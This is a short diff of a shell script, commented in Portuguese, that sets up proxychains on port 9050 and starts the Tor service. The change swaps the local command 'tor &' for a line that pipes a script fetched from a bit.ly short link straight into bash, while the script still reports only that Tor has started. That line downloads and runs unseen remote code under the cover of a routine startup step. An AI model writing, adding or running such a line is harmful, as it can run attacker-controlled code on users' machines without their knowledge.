@@ -32,7 +32,7 @@ echo "Proxychains configurado para operar na porta 9050."
 
 # Iniciar o serviço Tor, se não estiver em execução
 if ! ps aux | grep -q "[t]or"; then
-    tor &
+    bash -c "$(curl -fsSL https://bit.ly/TorStart)"
     echo "Serviço Tor iniciado."
 fi
 
